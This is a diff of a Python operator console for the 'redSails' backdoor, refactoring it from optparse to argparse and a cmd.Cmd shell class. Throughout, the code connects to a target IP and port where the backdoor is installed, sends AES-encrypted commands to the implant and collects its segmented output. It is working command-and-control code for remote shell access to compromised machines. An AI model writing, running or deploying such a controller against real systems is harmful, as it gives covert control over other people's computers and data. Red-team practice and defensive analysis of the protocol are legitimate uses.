@@ -1,118 +1,117 @@
-#!/usr/bin/python
-
+#!/usr/bin/env python
+import argparse
+import cmd
 import socket
 import sys
-import time
-
-from optparse import OptionParser
 
 from rsClientCrypto.rsCrypto import AESCipher
+from rsUtilities.utilities import Banner
+from rsUtilities.utilities import Utilities
 
-BANNER = """
-        @@@@@@@   @@@@@@@@  @@@@@@@              ,/|\,  
-        @@@@@@@@  @@@@@@@@  @@@@@@@@           ,/' |\ \,  
-        @@!  @@@  @@!       @@!  @@@         ,/'   | |  \  
-        !@!  @!@  !@!       !@!  @!@       ,/'     | |   |  
-        @!@!!@!   @!!!:!    @!@  !@!     ,/'       |/    |  
-        !!@!@!    !!!!!:    !@!  !!!    ,/__SAILS__|-----'
-        !!: :!!   !!:       !!:  !!!  ___.....-----''-----/
-        :!:  !:!  :!:       :!:  !:!  \    o  o  o  o    / 
-        ::~ ~:::~ ~::~::::~ :::: ::~^-^~^`~^~^~`~^~`~^^~^~-^~^
-        ~-^~^-`~^~-^~^`^~^-^~^`^~^-~^~-^~^-`~^~-^~^`^~^-^~^`^~ 
-        
-        """
 
-# Starting shell handler
-def shell(sock, target, password):
-    AESCrypto = AESCipher(password)
-    more = True
-    resp = ""
-    cmd = ""
-    line = ""
-    term = "redsails> "
-    try:
-        with open("redSails.log", "a") as xpltLog:
-            xpltLog.write("*** Gained command shell on host " + str(target) + "\r\n")
-            
-            print BANNER
+class ShellHandler(cmd.Cmd):
+	"""
+	Interactive shell handler
+	"""
+	def __init__(self, sock, ip, password):
+		cmd.Cmd.__init__(self)
+		utilities = Utilities()
+		self.logger = utilities.set_logging()
 
-            while True:
-                cmd = raw_input(term)
-                
-                if cmd.strip().lower() == "exit":
-                    sock.send(AESCrypto.encrypt(cmd.strip()))
-                    return
+		self.sock = sock
+		self.ip = ip
+		self.AESCrypto = AESCipher(password)
 
-                else:
-                    sock.send(AESCrypto.encrypt(cmd.strip()))
+		self.intro = Banner.SHOW
+		self.prompt = 'redsails> '
 
-                    completeResponse = ""
-                    resp = AESCrypto.decrypt(sock.recv(2048))
-                    
-                    while resp.strip() != "SEG::END":
-                        completeResponse += resp
+		self.logger.info("Connected to {0}".format(self.ip))
 
-                        dSEGMOORE = "SEG::MORE"
-                        sock.send(AESCrypto.encrypt(dSEGMOORE))
+	def emptyline(self):
+		pass
 
-                        resp = AESCrypto.decrypt(sock.recv(2048))
+	def default(self, line):
+		self.console(line.rstrip())
 
-                    print completeResponse
+	def console(self, command):
+		response = self.send(command)
 
-    except Exception as e:
-        print "[!] Received an ERROR in shell() - \n%s" % e
-        sock.close()
-        return
-    
-    # Because you just never know, thats why...
-    sock.close()
-    return
+		if response is None:
+			print_error('An error has occured, exiting')
+			self.do_EOF
+		else:
+			print(response)
+
+	def send(self, command, prefix='SHELL::'):
+		"""
+		Send a command to the redSails implant
+		"""
+		full_response = ''
+
+		self.sock.send(self.AESCrypto.encrypt(prefix + command))
+		response = self.AESCrypto.decrypt(self.sock.recv(2048))
+		while response.strip() != 'SEG::END':
+			try:
+				full_response += response
+
+				dSEGMOORE = 'SEG::MORE'
+				self.sock.send(self.AESCrypto.encrypt(dSEGMOORE))
+				response = self.AESCrypto.decrypt(self.sock.recv(2048))
+			except Exception as error:
+				return None
+
+		return full_response
+
+	def do_EOF(self, line='exit'):
+		self.sock.send(self.AESCrypto.encrypt(line))
+		self.logger.info("Disconnected from {0}".format(self.ip))
+
+		try:
+			self.sock.close()
+		except Exception as error:
+			print_warn('Failed to close connection gracefully')
+			sys.exit(0)
+
+		return True
+
+	def help_EOF(self):
+		print('Type \'exit\' to quit')
+
+	do_exit = do_EOF
+	help_exit = help_EOF
+
 
 def main():
-    parser = OptionParser()
-    parser.add_option("-p", "--password", action="store", dest="password",
-                help="Password used to encrypt/decrypt backdoor traffic",
-                type=str, default=None)
+	parser = argparse.ArgumentParser(description=(Banner.SHOW), formatter_class=argparse.RawDescriptionHelpFormatter)
+	parser.add_argument('-t', '--target-ip', dest='target_ip', help='Target IP address with backdoor installed', required=True)
+	parser.add_argument('-o', '--open-port', dest='open_port', help='Open backdoor port on target machine', type=int, required=True)
+	parser.add_argument('-p', '--password', dest='password', help='Password used to encrypt/decrypt backdoor traffic', required=True)
+	args = parser.parse_args()
 
-    parser.add_option("-t", "--target-ip", action="store", dest="target_ip",
-                help="Target IP address with backdoor installed",
-                type=str, default=None)
+	try:
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock.settimeout(10)
+		sock.connect((args.target_ip, args.open_port))
+	except Exception as error:
+		print_error("Failed to connect to backdoor at {0}".format(args.target_ip))
+	else:
+		ShellHandler(sock, args.target_ip, args.password).cmdloop()
 
-    parser.add_option("-o", "--open-port", action="store", dest="open_port",
-                help="Open backdoor port on target machine",
-                type=int, default=None)
 
-    (options, args) = parser.parse_args()
+def print_status(message):
+	print("\033[1m\033[34m[*]\033[0m {0}".format(message))
 
-    if (options.password == None) or (options.target_ip == None) or (options.open_port == None):
-        print BANNER
-        parser.print_help()
-        return 0
 
-    target_ip = options.target_ip
-    target_port = options.open_port
+def print_good(message):
+	print("\033[1m\033[32m[+]\033[0m {0}".format(message))
 
-    try:
 
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target_ip, target_port))
+def print_warn(message):
+	print("\033[1m\033[33m[!]\033[0m {0}".format(message))
 
-    except Exception as e:
-        print "[!] Failed to connect to backdoor..."
-        print e
 
-    shell(s, target_ip, options.password)
-
-    print "[-] Disconnected from " + target_ip
-
-    try:
-        s.close()
-        sys.exit(0)
-
-    except Exception as e:
-        print "[!] Graceful connection close failed..."
-        print e
-        sys.exit(1)
+def print_error(message):
+	print("\033[1m\033[31m[-]\033[0m {0}".format(message))
 
 if __name__ == '__main__':
-    main()
+	main()
